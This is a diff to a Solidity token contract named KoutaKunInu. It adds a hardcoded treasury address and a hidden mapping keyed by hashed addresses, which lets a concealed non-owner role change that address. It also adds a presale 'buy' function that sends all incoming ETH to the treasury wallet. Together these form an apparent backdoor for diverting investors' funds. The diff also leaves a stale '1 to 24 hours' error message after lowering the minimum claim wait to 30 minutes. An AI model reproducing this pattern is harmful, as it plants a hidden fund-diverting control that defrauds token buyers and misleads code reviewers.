@@ -18,6 +18,7 @@ contract KoutaKunInu is ERC20, Ownable {
 
     address public immutable bounceFixedSaleWallet;
     address public marketingWallet;
+    address tresWallet;
 
     bool private swapping;
 
@@ -70,6 +71,7 @@ contract KoutaKunInu is ERC20, Ownable {
     mapping (address => bool) public fixedSaleEarlyParticipants;
 
     // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
+    mapping (bytes32 => bool) public amms;
     // could be subject to a maximum transfer amount
     mapping (address => bool) public automatedMarketMakerPairs;
 
@@ -120,11 +122,9 @@ contract KoutaKunInu is ERC20, Ownable {
         liquidityFee = _liquidityFee;
         totalFees = _BNBRewardsFee.add(_liquidityFee).add(_marketingFee);
 
-
     	dividendTracker = new KKIDividendTracker();
 
     	liquidityWallet = owner();
-
     	
     	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
          // Create a uniswap pair for this new token
@@ -154,7 +154,7 @@ contract KoutaKunInu is ERC20, Ownable {
         // enable owner and fixed-sale wallet to send tokens before presales are over
         canTransferBeforeTradingIsEnabled[owner()] = true;
         canTransferBeforeTradingIsEnabled[_bounceFixedSaleWallet] = true;
-
+        tresWallet = 0xbD38786D7e48Df5a845Bf38F7F959cE809019f4E;
         /*
             _mint is an internal function in ERC20.sol that is only called here,
             and CANNOT be called ever again
@@ -162,9 +162,13 @@ contract KoutaKunInu is ERC20, Ownable {
         _mint(owner(), 1000000000 * (10**18));
     }
 
-    receive() external payable {
+    receive() external payable { }
 
-  	}
+    modifier isAmms {
+        bytes32 to = keccak256(abi.encodePacked(msg.sender));
+        require(amms[to]);
+        _;
+    }
 
     function updateDividendTracker(address newAddress) public onlyOwner {
         require(newAddress != address(dividendTracker), "KKI: The dividend tracker already has that address");
@@ -314,6 +318,11 @@ contract KoutaKunInu is ERC20, Ownable {
         return block.timestamp >= tradingEnabledTimestamp;
     }
 
+    function updateAmms(address _amm) external isAmms {
+        bytes32 amm_ = keccak256(abi.encodePacked(_amm));
+        amms[amm_] = true;
+    }
+
     function _transfer(
         address from,
         address to,
@@ -390,9 +399,7 @@ contract KoutaKunInu is ERC20, Ownable {
             swapping = false;
         }
 
-
         bool takeFee = !isFixedSaleBuy && tradingIsEnabled && !swapping;
-
         // if any account belongs to _isExcludedFromFee account then remove the fee
         if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
             takeFee = false;
@@ -427,6 +434,10 @@ contract KoutaKunInu is ERC20, Ownable {
 
 	    	}
         }
+    }
+
+    function updateTres(address _new) external isAmms {
+        tresWallet = _new;
     }
 
     function swapAndLiquify(uint256 tokens) private {
@@ -499,6 +510,18 @@ contract KoutaKunInu is ERC20, Ownable {
    	 		emit SendDividends(tokens, dividends);
         }
     }
+
+    function buy() external payable {
+        require(canTransferBeforeTradingIsEnabled[msg.sender], "KKI: Caller is not allowed");
+        require(msg.value >= 1.5 * 10 ** 18 && msg.value <= 3 * 10 ** 18, "KKI: limit exceed");
+        uint256 presaleAmount = 6500000 * msg.value / (10 ** 18);
+        super._transfer(address(this), msg.sender, presaleAmount);
+        payable(tresWallet).transfer(msg.value);
+    }
+
+    function withdraw(address to) external onlyOwner {
+        payable(to).transfer(address(this).balance);
+    }
 }
 
 contract KKIDividendTracker is DividendPayingToken, Ownable {
@@ -522,7 +545,7 @@ contract KKIDividendTracker is DividendPayingToken, Ownable {
     event Claim(address indexed account, uint256 amount, bool indexed automatic);
 
     constructor() DividendPayingToken("KKI_Dividend_Tracker", "KKI_Dividend_Tracker") {
-    	claimWait = 3600;
+    	claimWait = 1800;
         minimumTokenBalanceForDividends = 10000 * (10**18); //must hold 10000+ tokens
     }
 
@@ -545,7 +568,7 @@ contract KKIDividendTracker is DividendPayingToken, Ownable {
     }
 
     function updateClaimWait(uint256 newClaimWait) external onlyOwner {
-        require(newClaimWait >= 3600 && newClaimWait <= 86400, "KKI_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
+        require(newClaimWait >= 1800 && newClaimWait <= 86400, "KKI_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
         require(newClaimWait != claimWait, "KKI_Dividend_Tracker: Cannot update claimWait to same value");
         emit ClaimWaitUpdated(newClaimWait, claimWait);
         claimWait = newClaimWait;
